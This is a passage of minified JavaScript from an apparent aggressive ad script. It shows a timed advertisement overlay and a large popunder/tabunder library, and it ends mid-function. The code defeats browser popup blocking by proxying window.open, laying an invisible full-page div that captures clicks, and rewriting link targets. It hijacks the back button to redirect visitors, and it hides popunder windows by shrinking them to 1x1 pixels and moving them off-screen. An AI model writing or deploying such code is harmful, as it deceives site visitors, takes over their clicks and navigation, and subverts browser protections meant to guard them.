(function (e, g, p) {
  function T(a, b, c, d, f) {
    null == g.body && (g.body = g.createElement("body"));
    null == g.head && (g.head = g.createElement("head"));
    var h = g.createElement("style");
    h.innerHTML = "#a_timer_oYvwGmQc,#a_title_nEYjMupI,.a_close_nEYjMupI{top:0;right:0;height:30px;line-height:30px;text-align:center}.top-left_vUTDnibMkZJIvuTH{position:fixed;top:0;left:0}.bottom-left_vUTDnibMkZJIvuTH{position:fixed;bottom:0;left:0}.top-right_vUTDnibMkZJIvuTH{position:fixed;top:0;right:0}.bottom-right_vUTDnibMkZJIvuTH{position:fixed;bottom:0;right:0}.top-center_vUTDnibMkZJIvuTH{position:fixed;top:0;left:50%;transform:translateX(-50%)}.bottom-center_vUTDnibMkZJIvuTH{position:fixed;bottom:0;left:50%;transform:translateX(-50%)}.c_window_xEucqIjg{z-index:9999999;overflow:hidden;position:fixed;background-color:#FFF;margin:20px;padding:0;border:1px solid #ccc;border-radius:5px;-webkit-box-shadow:0 0 5px 1px rgba(153,153,153,.5);-moz-box-shadow:0 0 5px 1px rgba(153,153,153,.5);box-shadow:0 0 5px 1px rgba(153,153,153,.5)}#alink_overlay_EPXdyaUf{position:absolute;z-index:1;background:rgba(0,0,0,0);cursor:pointer}#a_iframe_DwTGCjTm{z-index:-1;padding:0!important}.a_close_nEYjMupI{position:absolute;color:rgba(0,0,0,.3);width:30px;font-size:30px}#a_title_nEYjMupI{position:absolute;color:rgba(0,0,0,1);font-size:18px}.a_close_nEYjMupI a{text-decoration:none!important}#a_timer_oYvwGmQc{position:absolute;color:rgba(0,0,0,.3);width:30px;font-size:30px}.a_close_nEYjMupI:focus,.a_close_nEYjMupI:hover{color:#000;cursor:pointer}.a_open_rrTmtfGj{display:block}.a_hide_qkasklrO{display:none}";
    g.head.appendChild(h);
    g.getElementById("c_window_xEucqIjg") && (clearTimeout(timedis), g.getElementById("c_window_xEucqIjg").remove());
    h = g.createElement("div");
    h.id = "c_window_xEucqIjg";
    g.body.appendChild(h);
    g.getElementById("c_window_xEucqIjg").classList.add("c_window_xEucqIjg");
    h.innerHTML = '<div style="height:30px;"><span id="a_title_nEYjMupI">Advertisement</span><span class="a_close_nEYjMupI a_hide_qkasklrO" data-alink="data-alink" id="a_close_nEYjMupI" data-dismiss_OLjQnDvi="c_xEucqIjg"><a href="#" data-alink="data-alink" data-dismiss_OLjQnDvi="c_xEucqIjg" style="text-decoration: none!important; color: rgba(0,0,0,0.3);">&times;</span></a><span id="a_timer_oYvwGmQc">5</span></div><div id="alink_overlay_EPXdyaUf" alink="alink"></div>';
    g.getElementById("c_window_xEucqIjg").classList.add(b + "_vUTDnibMkZJIvuTH");
    b = g.createElement("iframe");
    h = g.getElementById("c_window_xEucqIjg");
    var l = g.getElementById("a_title_nEYjMupI"),
      m = g.getElementById("alink_overlay_EPXdyaUf");
    h.style.width = c;
    var q = c.search(/px/i),
      D = d.search(/px/i),
      H = (Math.max(g.documentElement.clientWidth, e.innerWidth || 0), Math.max(g.documentElement.clientHeight, e.innerHeight || 0));
    if (-1 == q ? (m.style.width = "100%", b.style.width = "100%", l.style.width = "100%") : (m.style.width = c, b.style.width = c, l.style.width = c), -1 == D) b.style.height = "100%", m.style.height = "96%", h.style.height = d;else {
      l = function (n) {
        n.matches;
      };
      q = function () {
        Math.max(g.documentElement.clientWidth, e.innerWidth || 0);
        Math.max(g.documentElement.clientHeight, e.innerHeight || 0) < A && (g.getElementById("c_window_xEucqIjg").style.top = "0");
      };
      D = d.split("px")[0];
      var A = Number(D) + 30;
      m.style.height = d;
      b.style.height = d;
      h.style.height = A + "px";
      c = c.split("px")[0];
      d = Number(c) + 40;
      e.onresize = q;
      e.onload = q;
      m = g.createElement("style");
      if (m.innerHTML = "@media all and (max-width: " + d + "px){#c_window_xEucqIjg{position:fixed;top:0!important;left:0;right:0;width:90%!important;margin:10px auto auto!important;text-align:center}.bottom-center_vUTDnibMkZJIvuTH,.top-center_vUTDnibMkZJIvuTH{left:0!important;right:0!important;transform:none!important}#a_iframe_DwTGCjTm{width:100%!important;}#alink_overlay_EPXdyaUf{width:90%!important;height:90%!important},.bottom-right_vUTDnibMkZJIvuTH {top:0px!important;} }", g.head.appendChild(m), matchMedia) c = e.matchMedia("(min-width: " + c + "px)"), c.addListener(l), l(c);
      e.matchMedia("(orientation: landscape)").matches && H < A && (g.getElementById("c_window_xEucqIjg").style.top = "0");
      e.addEventListener("orientationchange", function () {
        e.matchMedia("(orientation:landscape)").matches || H < A && (g.getElementById("c_window_xEucqIjg").style.top = "0");
      });
    }
    b.src = a;
    b.name = "a_iframe_DwTGCjTm";
    b.id = "a_iframe_DwTGCjTm";
    b.frameBorder = "0";
    b.scrolling = "no";
    b.sandbox = "allow-forms allow-scripts";
    h.appendChild(b);
    g.getElementById("c_window_xEucqIjg").classList.add("a_open_rrTmtfGj");
    g.getElementById("a_iframe_DwTGCjTm").src = a;
    var B = 5,
      k = setInterval(function () {
        B--;
        0 >= B ? clearInterval(k) : g.getElementById("a_timer_oYvwGmQc").textContent = B;
      }, 1E3);
    timedis = setTimeout(function () {
      g.getElementById("a_close_nEYjMupI").classList.remove("a_hide_qkasklrO");
      g.getElementById("a_timer_oYvwGmQc").classList.add("a_hide_qkasklrO");
    }, 5E3);
    g.addEventListener("click", function (n) {
      clearInterval(k);
      var w = 5;
      k = setInterval(function () {
        w--;
        0 >= w ? clearInterval(k) : g.getElementById("a_timer_oYvwGmQc").textContent = w;
      }, 1E3);
      var C = (n = n || e.event).target || n.srcElement;
      if (C.hasAttribute("data-dismiss_OLjQnDvi") && "c_xEucqIjg" == C.getAttribute("data-dismiss_OLjQnDvi")) {
        var x = g.getElementById("c_window_xEucqIjg");
        g.getElementById("c_window_xEucqIjg").classList.add("a_hide_qkasklrO");
        x.classList.remove("a_open_rrTmtfGj");
        g.getElementById("c_window_xEucqIjg").remove();
        n.preventDefault();
      }
      C.hasAttribute("data-alink") && (x = g.getElementById("c_window_xEucqIjg"), g.getElementById("c_window_xEucqIjg").classList.add("a_hide_qkasklrO"), x.classList.remove("a_open_rrTmtfGj"), n.preventDefault());
      C.hasAttribute("alink") && (x = g.getElementById("c_window_xEucqIjg"), g.getElementById("c_window_xEucqIjg").classList.add("a_hide_qkasklrO"), x.classList.remove("a_open_rrTmtfGj"), e.open(f, "_blank").focus());
    }, !1);
  }
  Function.prototype.bind || (Function.prototype.bind = function (a) {
    if ("function" !== typeof this) throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
    var b = Array.prototype.slice.call(arguments, 1),
      c = this,
      d = function () {},
      f = function () {
        return c.apply(this instanceof d && a ? this : a, b.concat(Array.prototype.slice.call(arguments)));
      };
    d.prototype = this.prototype;
    f.prototype = new d();
    return f;
  });
  const watchedKeys = window.watchedKeys;
  if (!v) var v = {
    _cookieLockSet: function (a) {
      var b = "1";
      a && (b = "0");
      try {
        return localStorage.setItem("snrRQpLW", b), !0;
      } catch (d) {}
      a = new Date();
      var c = 6E4;
      a.setTime(a.getTime() + c);
      c = "expires=" + a.toUTCString();
      g.cookie = "snrRQpLW=" + b + ";" + c + ";path=/";
      return !0;
    },
    _cookieLockGet: function () {
      var a = !1;
      try {
        return localStorage.snrRQpLW && (a = "1" == localStorage.snrRQpLW), localStorage.setItem("snrRQpLW", "0"), a;
      } catch (f) {}
      for (var b = decodeURIComponent(g.cookie).split(";"), c = 0; c < b.length; c++) {
        for (var d = b[c]; " " == d.charAt(0);) d = d.substring(1);
        0 == d.indexOf("snrRQpLW=") && "1" == d.substring(10, d.length) && (a = !0);
      }
      a && this._cookieLockSet(!0);
      return a;
    },
    _windowOpen: function (a, b) {
      var c = "" + Math.random();
      "msie" == this.cap.env.b && 9 >= this.cap.env.v && (c = "");
      try {
        var d = b ? this.iframewin.open("about:blank", c, b) : this.iframewin.open("about:blank", c);
      } catch (f) {
        return !1;
      }
      if (this.settings.openernull) try {
        d.opener = null;
      } catch (f) {}
      try {
        d.location.replace(a);
      } catch (f) {}
      return d;
    },
    _openTabup: function (a) {
      return this._windowOpen(a);
    },
    _openTabunder: function (a) {
      if (0 == this.cap.tabunder) return this._openTabup(a);
      this._cookieLockSet(!1);
      var b = this._openTabup(g.location.href);
      if (!b) return !1;
      this.ti = setInterval(function () {
        if (b) try {
          g.location.replace(a);
        } catch (c) {
          clearInterval(this.ti);
        }
      }.bind(this), 10);
      return !0;
    },
    _getOptString: function () {
      return optstring = "top=" + (e.screenY || 0) + ",left=" + (e.screenX || 0) + ",width=" + (0 == e.outerWidth ? 99999 : e.outerWidth || e.screen.width) + ",height=" + (0 == e.outerHeight ? 99999 : e.outerHeight || e.screen.height) + ",status=0,location=1,toolbar=1,menubar=1,resizable=1,scrollbars=1";
    },
    _openPopup: function (a) {
      return this._windowOpen(a, this._getOptString());
    },
    _openPopunderSafari: function (a) {
      function b(c, d, f) {
        var h = g.createElement("iframe");
        h.style = "display:none;";
        g.body.appendChild(h);
        var l = h.contentWindow.document.createElement("script");
        l.type = "text/javascript";
        l.innerHTML = "window.parent = window.top = window.frameElement = null;window.mkp = function(url, name, opts) {var popWin = window.open(url, name, opts);try {popWin.opener = null} catch (e) {}return popWin;};";
        h.contentWindow.document.body.appendChild(l);
        c = h.contentWindow.mkp(c, d, f);
        g.body.removeChild(h);
        return c;
      }
      e.name = "" + Math.random();
      a = b(a, "" + Math.random(), this._getOptString());
      b("", e.name, "");
      e.name = null;
      return a;
    },
    _openPopunderBlur: function (a) {
      a = this._openPopup(a);
      try {
        g.focus();
      } catch (b) {}
      try {
        e.focus();
      } catch (b) {}
      try {
        a.blur();
      } catch (b) {}
      return a;
    },
    _openPopunderFF: function (a) {
      var b;
      setTimeout(function () {
        b = this._openPopup(a);
        "about:blank" == a && (this.prepop = b);
      }.bind(this), 0);
      setTimeout(function () {
        var c = e.open("about:blank", "_self");
        c && !c.closed && c.focus();
      }, 0);
      return !0;
    },
    _getPopunderCRResident: function (a) {
      var b = p.width,
        c = p.height;
      return "<body>\t\t<script>\t\ts1i=0;s2i=0;dc=0;focuscount=0;\t\twindow.resizeTo(20,20); \t\tfunction posred(){window.resizeTo(1,1);if (window.screenY>100) window.moveTo(0,0); else window.moveBy(" + b + "," + c + ")};\t\tfunction dance(){dc++;if (dc<3) return !1;if (s1i==0 ){s1i=window.setInterval(function(){ posred(); }, 50);}posred();window.clearInterval(s2i);document.onmousemove=null;};\t\tdocument.onmousemove=dance;\t\tfunction phash(){return window.screenX+','+window.screenY+','+window.outerWidth+','+window.outerHeight};\t\tphashc=phash();s2i=setInterval(function(){if (phashc!=phash()) {dance();phashc=phash()}; },100);\t\tvar deploy=function()\t\t{\t\t\tdc=0;window.clearInterval(s1i);window.clearInterval(s2i);document.onmousemove=null;\t\t\twindow.moveTo(0,0);\t\t\twindow.resizeTo(" + b + "," + c + ");\t\t\tif (window.name.match(/^https?:\\/\\//)) { window.location.replace(window.name); } else {window.name='ready';}\t\t};window.onblur=deploy;window.onfocus=function(){window.focuscount=1};setTimeout(function(){if (window.focuscount==0) deploy();}, 1000);setTimeout(function(){if (window.name.match(/^https?:\\/\\//)) deploy();}, " + a + ")\x3c/script>";
    },
    _getPopunderCROptionsString: function () {
      var a = p.width,
        b = 0;
      e.MSInputMethodContext && g.documentMode ? (a -= 200, b -= 200) : -1 !== navigator.userAgent.toLowerCase().indexOf("firefox") && (a -= 50);
      return "popup=1,top=" + b + ",left=" + a + ",width=5,height=5";
    },
    _openPopunderCRPre: function (a) {
      if (this.crpopsemaphore) return !1;
      this.crpopsemaphore = !0;
      a = this._getPopunderCRResident(a);
      try {
        var b = this.iframewin.open("about:blank", "", this._getPopunderCROptionsString());
      } catch (c) {
        return this.crpopsemaphore = !1;
      }
      if (this.settings.openernull) try {
        b.opener = null;
      } catch (c) {}
      try {
        b.document.open(), b.document.write(a), b.document.close();
      } catch (c) {
        return this.crpopsemaphore = !1;
      }
      this.crpopsemaphore = !1;
      return b;
    },
    _openPopunderCRPost: function (a) {
      "ready" == this.prepop.name ? this.prepop.location.replace(a) : this.prepop.name = a;
    },
    _getMinipopStatus: function (a) {
      if (!a || a.closed || !a.location) return "closed";
      try {
        var b = a.name;
      } catch (c) {
        b = "error";
      }
      return "error" == b ? "success" : "" == b ? "waiting" : "ready" == b ? "prepopready" : "redirecting";
    },
    _openPopunderCR: function (a, b) {
      if (this.crpopsemaphore) return !1;
      this.crpopsemaphore = !0;
      var c = this._getPopunderCRResident(b);
      try {
        var d = this.iframewin.open("about:blank", a, this._getPopunderCROptionsString());
      } catch (f) {
        return this.crpopsemaphore = !1;
      }
      if (this.settings.openernull) try {
        d.opener = null;
      } catch (f) {}
      try {
        d.document.open(), d.document.write(c), d.document.close();
      } catch (f) {
        return this.crpopsemaphore = !1;
      }
      return d;
    },
    _openPopunderIE11: function (a) {
      this.tw = this._openPopup(a);
      this.focusInterval && clearInterval(this.focusInterval);
      this.runs = 0;
      this.focusInterval = setInterval(function () {
        try {
          this.tw && (this.tw.blur(), this.tw.opener.focus(), e.self.focus(), e.focus(), g.focus());
        } catch (b) {}
        this.runs++;
        10 < this.runs && this.focusInterval && clearInterval(this.focusInterval);
      }.bind(this), 100);
      return this.tw;
    },
    _detectBrowser: function () {
      var a, b;
      var c = navigator.userAgent;
      var d = "desktop";
      var f = "chromium";
      var h = 100;
      if (b = c.match(/^Mozilla\/5\.0 \([^\)]+\) AppleWebKit\/[0-9\.]+ \(KHTML, like Gecko\) Chrome\/([0-9]+)[0-9\.]+ Safari\/[0-9\.]+$/)) f = "chrome", h = b[1];
      if (b = c.match(/(Firefox|OPR|Edge?)\/([0-9]+)/)) f = b[1].toLowerCase(), h = b[2];
      if (b = c.match(/rv:([0-9]+)\.0\) like Gecko/)) f = "msie", h = b[1];
      if (b = c.match(/MSIE ([0-9]+)/)) f = "msie", h = b[1];
      c.match(/Windows NT/) && (a = "windows");
      if (b = c.match(/([0-9]+)(_([0-9]+)){0,} like Mac OS X/)) a = "ios", f = "safari", h = b[1], d = "mobile";
      if (b = c.match(/(CrOS)\/([0-9]+)/)) f = "chrome", h = b[2];
      if (b = c.match(/\(KHTML, like Gecko\) Version\/([0-9]+)/)) f = "safari", h = b[1];
      c.match(/Macintosh; Intel Mac OS X /) && (a = "macosx");
      c.match(/Android|like Mac OS X|Mobile|Phone|Tablet/) && (d = "mobile");
      c.match(/^Mozilla\/5\.0 \(Linux; Android/) && (a = "android");
      "edg" == f && (f = "edge");
      "edge" == f && 50 < h && (f = "chromium");
      "opr" == f && (f = "chromium");
      "macosx" == a && 0 < navigator.maxTouchPoints && (a = "ios", f = "safari", d = "mobile");
      navigator.userAgent.startsWith("Mozilla/5.0 (X11; Linux x86_64)") && !navigator.platform.contains("84_64") && 2 <= navigator.maxTouchPoints && (a = "android", f = "chrome", d = "mobile");
      b = e != e.top;
      c = 0 == g.referrer.startsWith(e.location.origin) && !b;
      return {
        o: a,
        b: f,
        v: h,
        f: d,
        i: b,
        bbr: c
      };
    },
    _getBrowserCapabilities: function () {
      var a = this._detectBrowser(),
        b = !1,
        c = !0,
        d = !0;
      punderminipop = !1;
      var f = a.bbr;
      "desktop" == a.f ? ("chrome" == a.b && (b = !0), "firefox" == a.b && (b = !0), "msie" == a.b && (b = !0), "safari" == a.b && (b = !0), "chromium" == a.b && (b = !0), "edge" == a.b && (b = !1)) : d = b = c = !1;
      1 == a.i && (d = !1);
      punderminipop = b && ("msie" == a.b && 11 == a.v || "edge" == a.b || "chromium" == a.b || "chrome" == a.b || "firefox" == a.b && 85 <= a.v);
      return {
        env: a,
        popup: c,
        popunder: b,
        tabup: !0,
        tabunder: d,
        punderminipop: punderminipop,
        bbr: f
      };
    },
    _openPopunder: function (a, b) {
      var c = this.cap.env;
      return "desktop" == c.f ? this.cap.punderminipop ? (this.minipopmon = !0, this._openPopunderCR(a, b)) : "firefox" == c.b ? this._openPopunderFF(a) : "msie" == c.b && 11 > c.v ? this._openPopunderBlur(a) : "msie" == c.b && 11 == c.v ? this._openPopunderIE11(a) : "safari" == c.b ? this._openPopunderSafari(a) : this._openPopup(a) : this._openTabup(a);
    },
    _prepopOpen: function (a) {
      this.prepop = this.cap.punderminipop ? this._openPopunderCRPre(a) : this._openPopunder("about:blank");
    },
    _prepopReady: function () {
      return !(!this.prepop || this.prepop.closed || !this.prepop.location);
    },
    _prepopUse: function (a, b) {
      b.onbeforeopen instanceof Function ? a = b.onbeforeopen(a) : this.settings.onbeforeopen instanceof Function && (a = this.settings.onbeforeopen(a));
      if ("" == a) return !1;
      try {
        if (this.cap.punderminipop ? this._openPopunderCRPost(a) : this.prepop.location.replace(a), this.prepop = !1, b.onafteropen instanceof Function) b.onafteropen(a);else if (this.settings.onafteropen instanceof Function) this.settings.onafteropen(a);
      } catch (c) {
        return !1;
      }
      return !0;
    },
    _prepopClose: function () {
      try {
        this.prepop.close();
      } catch (a) {
        return !1;
      }
      return !0;
    },
    _openAd: function (a, b) {
      b.onbeforeopen instanceof Function ? a = b.onbeforeopen(a) : this.settings.onbeforeopen instanceof Function && (a = this.settings.onbeforeopen(a));
      if ("" == a) return !1;
      var c = b.type;
      "popunder" != c || this.cap.popunder || (c = "tabunder");
      "tabunder" != c || this.cap.tabunder || (c = "tabup");
      "tabup" != c || this.cap.tabup || (c = "popup");
      "popup" != c || this.cap.popup || (c = "tabup");
      var d;
      "popunder" == c ? d = this._openPopunder(a, b.crtimeout || this.settings.crtimeout) : "popup" == c ? d = this._openPopup(a) : "tabup" == c ? d = this._openTabup(a) : "tabunder" == c && (d = this._openTabunder(a));
      if (b.onafteropen instanceof Function) b.onafteropen();else if (this.settings.onafteropen instanceof Function) this.settings.onafteropen();
      return d;
    },
    abortPop: function () {
      this._prepopReady() && this._prepopClose();
      this._removeCatchAllDiv();
      this.clearUrls();
      this.settings.prepop = !1;
    },
    _minipopCheck: function (a) {
      if (this.minipopmon) {
        var b = this._getMinipopStatus(this.minipopmontw);
        if ("prepopready" == b || "success" == b || "redirecting" == b) {
          if ("redirecting" == b || "success" == b) this.urls.shift(), this.minipopmon = !1;
        } else "closed" == b && (this.minipopmon = !1);
        a && setInterval(this._minipopCheck.bind(this), 100, !0);
      }
    },
    _getUrlCount: function () {
      for (var a = 0, b = 0, c = 0; c < this.urls.length; c++) "bbr" == this.urls[c].options.type ? a++ : (this.urls[c].options.bbr && a++, b++);
      return {
        bbr: a,
        nonbbr: b
      };
    },
    _onExecute: function (a) {
      a = a || e.event;
      var b = this._getUrlCount();
      if ("click" == a.type || "mouseup" == a.type || "mousedown" == a.type) {
        var c = !1;
        "which" in a ? c = 3 == a.which : "button" in a && (c = 2 == a.button);
        if (c) return !1;
        this._removeCatchAllDiv();
      }
      if (this.bbrhooked && "popstate" == a.type) {
        this._removeCatchAllDiv();
        for (c = 0; c < this.urls.length; c++) if (this.urls[c].options.bbr || "bbr" == this.urls[c].options.type) {
          this._prepopReady() && this._prepopClose();
          b = this.urls[c].url;
          this.urls[c].options.onbeforeopen instanceof Function ? b = this.urls[c].options.onbeforeopen(b) : this.settings.onbeforeopen instanceof Function && (b = this.settings.onbeforeopen(b));
          if ("" == b) return !1;
          e.top.location.replace(b);
          return !0;
        }
        this.bbrhooked = !1;
        history.go(-1);
      }
      if (this.userActivation) try {
        if (!e.navigator.userActivation.isActive && !this.iframewin.navigator.userActivation.isActive) return this._removeCatchAllDiv(), !1;
      } catch (d) {}
      this._minipopCheck(!1);
      0 == b.nonbbr && this.settings.prepop && !this._prepopReady() && (this.settings.prepop = !1, this._prepopOpen(this.settings.crtimeout), this._unblockWindowOpen(), this._removeCatchAllDiv());
      if (0 == b.nonbbr || 1 == b.nonbbr && this._prepopReady()) this._unblockWindowOpen(), this._removeCatchAllDiv();
      if (0 == b.nonbbr) return !1;
      a.preventDefault && a.preventDefault();
      a.stopImmediatePropagation && a.stopImmediatePropagation();
      this.settings.prepop = !1;
      a = this.urls[0];
      this.minipopmon = !1;
      a = this._openAd(a.url, a.options);
      this.minipopmon ? (this.minipopmontw = a, this._minipopCheck(!0), this.catchalldiv && 2 > b.nonbbr && this._removeCatchAllDiv()) : (a || this.settings.ignorefailure) && this.urls.shift();
    },
    _userActivationHandler: function () {
      var a = !1;
      try {
        a = e.navigator.userActivation.isActive;
      } catch (b) {}
      if (!a) try {
        a = top.navigator.userActivation.isActive;
      } catch (b) {}
      if (!a) try {
        a = this.iframewin.navigator.userActivation.isActive;
      } catch (b) {}
      a && this._onExecute({
        type: "uah"
      });
    },
    _onMouseDownHandler: function (a) {
      a = a.target || a.srcElement || a.toElement;
      var b = this._getUrlCount();
      if (this._prepopReady()) return !1;
      var c = !1;
      if (this.minipopmontw) {
        var d = this._getMinipopStatus(this.minipopmontw);
        "waiting" == d && (c = !0);
        "prepopready" == d && (c = !0);
      }
      if (c || "A" != a.tagName) return !1;
      if (a.popjsoriginalhref && 0 == b.nonbbr) return a.href = a.popjsoriginalhref, delete a.popjsoriginalhref, a.target = "_blank", !1;
      if ("_blank" != a.target && 0 < g.getElementsByTagName("BASE").length && "_blank" != (g.getElementsByTagName("BASE")[0].target || "").toLowerCase() || 0 == b.nonbbr) return !1;
      a.popjsoriginalhref = a.href;
      a.href = "#";
      a.target = "";
    },
    _onBeforeUnloadHandler: function () {
      this._prepopReady() && this._prepopClose();
    },
    _isCatchAllNeeded: function () {
      function a(b) {
        b = g.getElementsByTagName(b);
        for (var c = 0; c < b.length; c++) if (100 < (b.item(c).clientHeight || b.item(c).offsetHeight || 0) || 100 < (b.item(c).clientWidth || b.item(c).offsetWidth || 0)) return !0;
        return !1;
      }
      return a("IFRAME") || a("VIDEO") || a("OBJECT");
    },
    _removeCatchAllDiv: function () {
      this.catchalldiv && (this.catchalldiv.parentNode.removeChild(this.catchalldiv), delete this.catchalldiv);
    },
    _createCatchAllDiv: function () {
      if (0 == g.getElementsByTagName("body").length) return !1;
      var a = g.createElement("div");
      a.style = "position: fixed; display: block; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0); z-index: 300000;";
      g.addEventListener ? ("desktop" != this.cap.env.f && "ios" == this.cap.env.o && a.addEventListener("touchend", this._onExecute.bind(this)), a.addEventListener("click", this._onExecute.bind(this))) : a.attachEvent("onclick", this._onExecute.bind(this));
      g.getElementsByTagName("body")[0].appendChild(a);
      this.catchalldiv = a;
      return !0;
    },
    _deployCatchAll: function () {
      this.settings.catchalldiv && (this._isCatchAllNeeded() && !this.catchalldiv ? this._createCatchAllDiv() : this.catchallmon || (this.catchallmon = setInterval(function () {
        this.catchalldiv ? clearInterval(this.catchallmon) : this._isCatchAllNeeded() && (clearInterval(this.catchallmon), this._createCatchAllDiv());
      }.bind(this), 500)));
    },
    _blockWindowOpen: function () {
      if (this.windowopenblocked) return !1;
      this.windowopenblocked = !0;
      e.open = new Proxy(e.open, {
        apply: function (a, b, c) {
          a = g.createElement("iframe");
          a.src = "javascript:false";
          a.style.display = "none";
          a.width = "0";
          a.height = "0";
          b = g.getElementsByTagName("script")[0];
          b.parentNode.insertBefore(a, b);
          return a.contentWindow || a;
        }
      });
      return !0;
    },
    _unblockWindowOpen: function () {
      if (!this.windowopenblocked) return !1;
      this.windowopenblocked = !1;
      e.open = this.originalwindowopen;
      return !0;
    },
    init: function (a) {
      if (this._cookieLockGet()) return !1;
      var b = g.createElement("iframe");
      b.src = "javascript:false";
      b.style.display = "none";
      b.width = "0";
      b.height = "0";
      var c = g.getElementsByTagName("script")[0];
      c.parentNode.insertBefore(b, c);
      this.iframewin = b.contentWindow || b;
      this.originalwindowopen = this.iframewin.open;
      this.userActivation = !0;
      try {
        this.iframewin.navigator.userActivation.isActive;
      } catch (d) {
        this.userActivation = !1;
      }
      this.cap = this._getBrowserCapabilities();
      this.urls = [];
      this.settings = {};
      this.settings.prepop = (a.prepop || !1) && this.cap.popunder;
      this.settings.crtimeout = a.crtimeout || 6E4;
      this.settings.targetblankhandler = a.targetblankhandler || !0;
      this.settings.onbeforeopen = a.onbeforeopen;
      this.settings.onafteropen = a.onafteropen;
      this.settings.ignorefailure = a.ignorefailure || !1;
      this.settings.catchalldiv = a.catchalldiv || !this.userActivation;
      this.bbrhooked = this.minipopmon = !1;
      this.settings.openernull = !0;
      this._deployCatchAll();
      this.settings.prepop && this._blockWindowOpen();
      this.userActivation && setInterval(this._userActivationHandler.bind(this), 50);
      e.addEventListener ? (e.addEventListener("touchend", this._onExecute.bind(this), !0), e.addEventListener("click", this._onExecute.bind(this), !0), this.cap.bbr && e.addEventListener("popstate", this._onExecute.bind(this), !0), this.settings.targetblankhandler && e.addEventListener("mousedown", this._onMouseDownHandler.bind(this), !0), this.settings.prepop && e.addEventListener("beforeunload", this._onBeforeUnloadHandler.bind(this), !0)) : (e.attachEvent("onclick", this._onExecute.bind(this)), this.cap.bbr && e.attachEvent("onpopstate", this._onExecute.bind(this)), this.settings.targetblankhandler && e.attachEvent("onmousedown", this._onMouseDownHandler.bind(this)), this.settings.prepop && e.attachEvent("onbeforeunload", this._onBeforeUnloadHandler.bind(this)));
      this.iframewin.addEventListener ? (this.iframewin.addEventListener("touchend", this._onExecute.bind(this), !0), this.iframewin.addEventListener("click", this._onExecute.bind(this), !0), this.settings.targetblankhandler && this.iframewin.addEventListener("mousedown", this._onMouseDownHandler.bind(this), !0), this.settings.prepop && this.iframewin.addEventListener("beforeunload", this._onBeforeUnloadHandler.bind(this), !0)) : (this.iframewin.attachEvent("onclick", this._onExecute.bind(this)), this.settings.targetblankhandler && this.iframewin.attachEvent("onmousedown", this._onMouseDownHandler.bind(this)), this.settings.prepop && this.iframewin.attachEvent("onbeforeunload", this._onBeforeUnloadHandler.bind(this)));
    },
    _hookBackButton: function () {
      "complete" === g.readyState ? this.bbrhooked || (e.history.pushState({}, "", null), this.bbrhooked = !0) : e.addEventListener("load", this._hookBackButton.bind(this), !0);
    },
    clearUrls: function () {
      this.urls = [];
    },
    addUrl: function (a, b) {
      if (!a.match(/^https?:\/\//) || !this.cap) return !1;
      if ("bbr" == b.type) {
        if (!this.cap.bbr) return !1;
        this._hookBackButton();
        this.urls.push({
          url: a,
          options: b
        });
        return !0;
      }
      var c = !1;
      this._prepopReady() && ("popunder" == b.type ? this._prepopUse(a, b) && (c = !0) : "bbr" != b.type && this._prepopClose());
      c || this.settings.ignorefailure || (b.bbr && this.cap.bbr && this._hookBackButton(), this._blockWindowOpen(), this._deployCatchAll());
      this.urls.push({
        url: a,
        options: b
      });
    }
  };
  function obtainJSHook() {
    if (!window.jsHook) {
      window.jsHook = {
        queue: [],
        record(key, value) {
          this.queue.push({
            key,
            timestamp: Date.now(),
            value
          });
        },
        drain() {
          const records = [...this.queue];
          this.queue.length = 0;
          return records;
        }
      };
    }
  }
  var I = {
    a: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    encode: function (a) {
      var b = "",
        c = 0;
      for (a = I.b(a); c < a.length;) {
        var d = a.charCodeAt(c++);
        var f = a.charCodeAt(c++);
        var h = a.charCodeAt(c++);
        var l = d >> 2;
        d = (3 & d) << 4 | f >> 4;
        var m = (15 & f) << 2 | h >> 6;
        var q = 63 & h;
        isNaN(f) ? m = q = 64 : isNaN(h) && (q = 64);
        b = b + this.a.charAt(l) + this.a.charAt(d) + this.a.charAt(m) + this.a.charAt(q);
      }
      return b;
    },
    decode: function (a) {
      var b = "",
        c = 0;
      for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ""); c < a.length;) {
        var d = this.a.indexOf(a.charAt(c++));
        var f = this.a.indexOf(a.charAt(c++));
        var h = this.a.indexOf(a.charAt(c++));
        var l = this.a.indexOf(a.charAt(c++));
        d = d << 2 | f >> 4;
        f = (15 & f) << 4 | h >> 2;
        var m = (3 & h) << 6 | l;
        b += String.fromCharCode(d);
        64 != h && (b += String.fromCharCode(f));
        64 != l && (b += String.fromCharCode(m));
      }
      return I.c(b);
    },
    b: function (a) {
      a = a.replace(/\r\n/g, "\n");
      for (var b = "", c = 0; c < a.length; c++) {
        var d = a.charCodeAt(c);
        128 > d ? b += String.fromCharCode(d) : 127 < d && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128));
      }
      return b;
    },
    c: function (a) {
      var b = "",
        c = 0;
      for (c1 = c2 = 0; c < a.length;) {
        var d = a.charCodeAt(c);
        128 > d ? (b += String.fromCharCode(d), c++) : 191 < d && 224 > d ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((31 & d) << 6 | 63 & c2), c += 2) : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((15 & d) << 12 | (63 & c2) << 6 | 63 & c3), c += 3);
      }
      return b;
    }
  };
  function generateKeySignature(input) {
    const properties = Object.keys(input);
    const combinedProperties = properties.join("");
    let hash = 0;
    for (let i = 0; i < combinedProperties.length; i++) {
      const charCode = combinedProperties.charCodeAt(i);
      hash = (hash << 5) - hash + charCode;
      hash |= 0;
    }
    return hash.toString(16);
  }
  !function (a, b, c) {
    "undefined" != typeof module && module.exports ? module.exports = c(b, a) : "function" == typeof define && define.amd ? define("detect-zoom", function () {
      return c(b, a);
    }) : a[b] = c(b, a);
  }(e, "detectZoom", function () {
    var a = function () {
        return e.devicePixelRatio || 1;
      },
      b = function () {
        return {
          zoom: 1,
          devicePxPerCssPx: 1
        };
      },
      c = function () {
        var k = Math.round(p.deviceXDPI / p.logicalXDPI * 100) / 100;
        return {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      d = function () {
